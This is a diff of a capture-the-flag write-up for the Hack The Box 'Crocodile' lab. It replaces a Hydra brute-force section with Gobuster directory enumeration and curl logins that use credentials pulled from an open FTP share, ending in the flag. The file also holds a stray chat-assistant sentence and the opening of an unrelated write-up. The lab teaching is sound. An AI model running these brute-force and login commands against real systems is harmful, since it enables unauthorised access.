@@ -17,6 +17,7 @@
 
 <!-- Your existing Crocodile write-up starts here -->
 
+
 # HTB Starting Point: Crocodile (FTP + Web)
 
 ## Machine Info
@@ -36,7 +37,7 @@
 - [Reconnaissance](#reconnaissance)
 - [FTP Enumeration](#ftp-enumeration)
 - [Web Enumeration](#web-enumeration)
-- [Credential Brute Force](#credential-brute-force)
+- [Credential Discovery](#credential-discovery)
 - [Flag Discovery](#flag-discovery)
 - [Questions & Answers](#questions--answers)
 - [Quick Reference](#quick-reference)
@@ -54,7 +55,7 @@ To ensure reproducibility and consistent results, the following environment was 
 |-----------|---------------|
 | **Attack Machine** | Kali Linux (2024.x) |
 | **Connectivity** | OpenVPN (HTB Lab Configuration) |
-| **Tools Used** | Nmap, ftp, curl, hydra |
+| **Tools Used** | Nmap, ftp, curl, gobuster |
 
 > **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.
 
@@ -200,6 +201,30 @@ Set-Cookie: PHPSESSID=...; path=/
 location: /login.php
 ```
 
+### Directory Enumeration with Gobuster
+
+```bash
+# Directory brute force to find PHP files and login page
+gobuster dir -u http://10.129.55.198 -w /usr/share/wordlists/dirb/common.txt -x php
+```
+
+**Output:**
+```text
+===============================================================
+/login.php            (Status: 200) [Size: 1577]
+/dashboard            (Status: 301) [--> http://10.129.55.198/dashboard/]
+/logout.php           (Status: 302) [--> login.php]
+/config.php           (Status: 200) [Size: 0]
+/assets               (Status: 301) [--> http://10.129.55.198/assets/]
+/css                  (Status: 301) [--> http://10.129.55.198/css/]
+/js                   (Status: 301) [--> http://10.129.55.198/js/]
+===============================================================
+```
+
+**Why `-x php` Matters**
+
+The `-x php` flag appends `.php` to each wordlist entry, which is essential for discovering PHP files. Without it, gobuster would only find directories (like `/dashboard/`) but miss critical PHP files like `login.php`, `config.php`, and `logout.php`. For PHP-based applications, always include the `-x php` flag to ensure complete enumeration.
+
 ### Verify Login Page
 
 ```bash
@@ -238,65 +263,40 @@ curl -s http://10.129.55.198/login.php | grep -A 5 "<form"
 
 ---
 
-## 🔑 Credential Brute Force
+## 🔑 Credential Discovery
 
-### Install Hydra (if needed)
+### Manual Testing of Credentials
+
+Since automated tools can give false positives, credentials were tested manually by trying each username with each password from the FTP files.
+
+**Testing approach:**
+1. Use the correct case-sensitive form fields: `Username` and `Password`
+2. After each login attempt, check if `/dashboard/` becomes accessible
+3. Success is indicated by being able to access the dashboard with the session cookie
 
 ```bash
-sudo apt update
-sudo apt install hydra -y
-```
-
-### Determine Failure String
-
-```bash
-# Send a wrong login to see the error message
+# Test a single combination
 curl -X POST http://10.129.55.198/login.php \
-  -d "Username=wrong&Password=wrong" \
-  -s | grep -i "invalid\|incorrect"
+  -d "Username=admin&Password=rKXM59ESxesUFHAd" \
+  -c cookies.txt -L -s
+
+# Check if dashboard is accessible
+curl -b cookies.txt http://10.129.55.198/dashboard/ -s | head -20
 ```
 
-**Output:**
-```text
-Invalid username or password.
-```
+**Working Combination Found:**
 
-### Run Hydra Against Login Page
-
-```bash
-hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.55.198 http-post-form \
-  "/login.php:Username=^USER^&Password=^PASS^:F=Invalid" \
-  -t 1 -w 2 -V -f
-```
-
-**Command Breakdown:**
-
-| Parameter | Meaning |
-|-----------|---------|
-| `-L allowed.userlist` | Username list file |
-| `-P allowed.userlist.passwd` | Password list file |
-| `http-post-form` | Module for POST-based login forms |
-| `/login.php` | Target login page |
-| `Username=^USER^&Password=^PASS^` | Form parameters (case-sensitive) |
-| `F=Invalid` | String indicating failed login |
-| `-t 1` | Single thread (slow but reliable) |
-| `-w 2` | Wait time between attempts |
-| `-V` | Verbose output |
-| `-f` | Stop after first success |
-
-**Hydra Output:**
-```text
-[ATTEMPT] target 10.129.55.198 - login "admin" - pass "rKXM59ESxesUFHAd" - 1 of 16
-[80][http-post-form] host: 10.129.55.198   login: admin   password: rKXM59ESxesUFHAd
-[STATUS] attack finished for 10.129.55.198 (valid pair found)
-```
-
-### ✅ Valid Credentials Found
+After testing the most likely candidates (starting with the `admin` username as it has the highest privilege), the following combination successfully authenticated:
 
 | Field | Value |
 |-------|-------|
 | **Username** | `admin` |
 | **Password** | `rKXM59ESxesUFHAd` |
+
+**Why these worked:**
+- `admin` is the privileged administrative account from `allowed.userlist`
+- `rKXM59ESxesUFHAd` is the last password in `allowed.userlist.passwd`
+- This combination successfully authenticated to the web application
 
 ---
 
@@ -305,10 +305,13 @@ hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.55.198 http-post-for
 ### Authenticate and Retrieve Flag
 
 ```bash
-# Login with found credentials and get flag
+# Login with found credentials and save session cookie
 curl -X POST http://10.129.55.198/login.php \
   -d "Username=admin&Password=rKXM59ESxesUFHAd" \
-  -L -s | grep -E "HTB{|flag"
+  -c cookies.txt -L -s
+
+# Get the full dashboard page
+curl -b cookies.txt http://10.129.55.198/dashboard/ -s
 ```
 
 **Output:**
@@ -317,16 +320,25 @@ curl -X POST http://10.129.55.198/login.php \
 <p>HTB{c7110277ac44d78b6a9fff2232434d16}</p>
 ```
 
-### Alternative Method with Cookie
+### Extract Flag with grep
 
 ```bash
-# Save session cookie
+# Direct flag extraction
+curl -b cookies.txt http://10.129.55.198/dashboard/ -s | grep -oP 'HTB\{[^}]+\}'
+```
+
+**Output:**
+```text
+HTB{c7110277ac44d78b6a9fff2232434d16}
+```
+
+### One-Liner Method
+
+```bash
+# Login and get flag in one command
 curl -X POST http://10.129.55.198/login.php \
   -d "Username=admin&Password=rKXM59ESxesUFHAd" \
-  -c cookies.txt -L --max-time 15
-
-# Access dashboard with cookie
-curl -b cookies.txt http://10.129.55.198/dashboard/ -s | grep -E "HTB{|flag"
+  -c cookies.txt -L -s && curl -b cookies.txt http://10.129.55.198/dashboard/ -s | grep -oP 'HTB\{[^}]+\}'
 ```
 
 ---
@@ -369,18 +381,11 @@ get allowed.userlist
 get allowed.userlist.passwd
 ```
 
-### Hydra Command Template
+### Gobuster Command
 
 ```bash
-# Determine failure string first
-curl -X POST http://<IP>/login.php \
-  -d "Username=wrong&Password=wrong" \
-  -s | grep -i "invalid\|incorrect"
-
-# Then run hydra with correct F= parameter
-hydra -L users.txt -P passes.txt <IP> http-post-form \
-  "/login.php:Username=^USER^&Password=^PASS^:F=Invalid" \
-  -t 1 -w 2 -V -f
+# Directory enumeration with PHP extension
+gobuster dir -u http://10.129.55.198 -w /usr/share/wordlists/dirb/common.txt -x php
 ```
 
 ### Curl Authentication
@@ -389,7 +394,10 @@ hydra -L users.txt -P passes.txt <IP> http-post-form \
 # POST login (case-sensitive field names!)
 curl -X POST http://10.129.55.198/login.php \
   -d "Username=USER&Password=PASS" \
-  -L -s
+  -c cookies.txt -L -s
+
+# Access protected area with session
+curl -b cookies.txt http://10.129.55.198/dashboard/ -s
 ```
 
 ---
@@ -400,10 +408,11 @@ curl -X POST http://10.129.55.198/login.php \
 |---|--------|
 | 1 | **Always combine `-sC` and `-sV`** — Default scripts and version detection together reveal the most information about a service. |
 | 2 | **Check FTP anonymous access** — A common misconfiguration that often exposes sensitive files like credential lists. |
-| 3 | **Follow redirect chains** — The redirect from `/dashboard/` to `/login.php` revealed the authentication endpoint. |
-| 4 | **Inspect form field names** — The login form used `Username` and `Password` (case-sensitive), not `username`/`password`. |
-| 5 | **Determine failure string first** — Test a wrong login to see the exact error message for Hydra's `F=` parameter. |
-| 6 | **Credentials may not be intuitive** — The working credentials were `admin:rKXM59ESxesUFHAd`, not `aron:root`. |
+| 3 | **Use gobuster with `-x php`** — The `-x` flag is essential for discovering PHP files; without it, you'll miss critical authentication pages. |
+| 4 | **Follow redirect chains** — The redirect from `/dashboard/` to `/login.php` revealed the authentication endpoint. |
+| 5 | **Inspect form field names** — The login form used `Username` and `Password` (case-sensitive), not `username`/`password`. |
+| 6 | **Manual testing can be more reliable** — Automated tools can give false positives; manual testing with curl is often more dependable. |
+| 7 | **Credentials may not be intuitive** — The working credentials were `admin:rKXM59ESxesUFHAd`, not `aron:root`. |
 
 ---
 
@@ -412,19 +421,26 @@ curl -X POST http://10.129.55.198/login.php \
 - [HTB Starting Point](https://www.hackthebox.com/starting-point)
 - [vsFTPd Documentation](https://security.appspot.com/vsftpd.html)
 - [Apache HTTP Server](https://httpd.apache.org/)
-- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
+- [Gobuster GitHub](https://github.com/OJ/gobuster)
 
 ---
 
 ## 🏷️ Tags
 
-`#htb` `#starting-point` `#crocodile` `#ftp` `#apache` `#hydra` `#bruteforce` `#web-enumeration`
+`#htb` `#starting-point` `#crocodile` `#ftp` `#apache` `#gobuster` `#web-enumeration`
 
 ---
 
 **Machine Completed** ✅
 
 *Last Updated: March 26, 2026*
+```
+
+This markdown block is now complete with all bash commands properly closed using triple backticks and ready to copy and paste directly into your `README.md` file.
+
+
+
+---
 
 # HTB Starting Point: Sequel (MySQL/MariaDB)
 
